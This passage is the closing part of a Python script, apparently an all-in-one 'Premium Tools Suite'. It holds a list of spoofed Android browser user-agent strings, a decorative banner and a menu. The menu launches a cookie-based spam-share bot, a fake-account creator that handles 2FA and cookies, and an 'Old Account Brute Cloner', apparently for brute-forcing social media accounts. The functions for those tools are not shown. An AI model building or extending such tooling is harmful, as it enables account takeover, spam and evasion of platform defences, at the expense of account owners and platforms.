    "Mozilla/5.0 (Linux; Android 14; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.7746.75 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.7769.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.7792.97 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.7815.108 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Nokia G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.7838.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.7861.130 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.7884.141 Mobile Safari/537.36",
]

_ALL_UA_EXTRA = _STATIC_UA_POOL + _EXT_UA_POOL + _EXTRA_UA_C

def get_ua_extra() -> str:
    return random.choice(_ALL_UA_EXTRA)


# ============================================================
#  MASTER UNIFIED MENU  -  All Tools Combined
# ============================================================

def _master_banner():
    clear_screen()
    _ip = get_public_ip()
    _dt = get_datetime()
    print(f"""\033[38;5;220m
  ╔══════════════════════════════════════════════════════════╗
  ║                                                          ║
  ║  \033[1m\033[38;5;196m ██████╗ \033[38;5;214m██████╗ \033[38;5;226m███████╗\033[38;5;118m███╗   ███╗\033[38;5;220m                   ║
  ║  \033[38;5;196m ██╔══██╗\033[38;5;214m██╔══██╗\033[38;5;226m██╔════╝\033[38;5;118m████╗ ████║\033[38;5;220m                   ║
  ║  \033[38;5;196m ██████╔╝\033[38;5;214m██████╔╝\033[38;5;226m█████╗  \033[38;5;118m██╔████╔██║\033[38;5;220m                   ║
  ║  \033[38;5;196m ██╔═══╝ \033[38;5;214m██╔══██╗\033[38;5;226m██╔══╝  \033[38;5;118m██║╚██╔╝██║\033[38;5;220m                   ║
  ║  \033[38;5;196m ██║     \033[38;5;214m██║  ██║\033[38;5;226m███████╗\033[38;5;118m██║ ╚═╝ ██║\033[38;5;220m                   ║
  ║  \033[38;5;196m ╚═╝     \033[38;5;214m╚═╝  ╚═╝\033[38;5;226m╚══════╝\033[38;5;118m╚═╝     ╚═╝\033[38;5;220m                   ║
  ║                                                          ║
  ║  \033[0m\033[38;5;51m\033[1m  T O O L S   S U I T E   ·   A L L - I N - O N E   v 3 . 1  \033[0m\033[38;5;220m  ║
  ║                                                          ║
  ╠══════════════════════════════════════════════════════════╣
  ║  \033[38;5;39m\033[1m [+] IP    \033[0m\033[38;5;220m│\033[0m\033[97m  {_ip:<44}\033[38;5;220m  ║
  ║  \033[38;5;46m\033[1m [+] TIME  \033[0m\033[38;5;220m│\033[0m\033[97m  {_dt:<44}\033[38;5;220m  ║
  ╚══════════════════════════════════════════════════════════╝\033[0m""")


def master_menu():
    while True:
        _master_banner()
        print("\033[38;5;220m  ╔══════════════════════════════════════════════════════════╗\033[0m")
        print("\033[38;5;220m  ║  \033[1m\033[38;5;213m  ▌ SELECT YOUR TOOL ▌                                \033[0m\033[38;5;220m  ║\033[0m")
        print("\033[38;5;220m  ╠══════════════════════════════════════════════════════════╣\033[0m")
        print("\033[38;5;220m  ║  \033[1m\033[38;5;129m [1]  \033[0m\033[38;5;165m SPAM SHARE   \033[38;5;220m│\033[0m\033[97m  Cookie-Based Post Share Bot          \033[38;5;220m║\033[0m")
        print("\033[38;5;220m  ║  \033[1m\033[38;5;46m  [2]  \033[0m\033[38;5;82m  AUTO CREATE  \033[38;5;220m│\033[0m\033[97m  Account Creator / 2FA / Cookies      \033[38;5;220m║\033[0m")
        print("\033[38;5;220m  ║  \033[1m\033[38;5;196m [3]  \033[0m\033[38;5;214m CRACKING      \033[38;5;220m│\033[0m\033[97m  Old Account Brute Cloner             \033[38;5;220m║\033[0m")
        print("\033[38;5;220m  ║  \033[1m\033[38;5;240m [0]  \033[0m\033[38;5;245m EXIT          \033[38;5;220m│\033[0m\033[97m  Quit Program                         \033[38;5;220m║\033[0m")
        print("\033[38;5;220m  ╚══════════════════════════════════════════════════════════╝\033[0m")
        print("\033[38;5;240m  ─────────────────────────────────────────────────────────────\033[0m")
        _ch = input("\033[38;5;220m  \033[1m[>>]\033[0m\033[38;5;51m SELECT \033[38;5;220m: \033[0m\033[97m").strip()
        if _ch == '1':
            nika_main()
        elif _ch == '2':
            method()
        elif _ch == '3':
            fbclone_main()
        elif _ch in ('0', 'q', 'Q', 'exit', 'EXIT'):
            print(f"\n{GOLD}  ◆  Goodbye — Premium Tools Suite  ◆{RESET}\n")
            import sys as _sys; _sys.exit(0)
        else:
            print(f"{R}  [!]  Invalid — enter 1, 2, 3 or 0{RESET}")
            input(f"{GOLD}  ▶ Press Enter to continue{RESET} ")



# ============================================================
#  ENTRY POINT
# ============================================================
if __name__ == "__main__":
    import sys as _entry_sys
    _entry_sys.stdout.write('\x1b]2; PREMIUM TOOLS SUITE v3.1\x07')
    install_dependencies()
    master_menu()
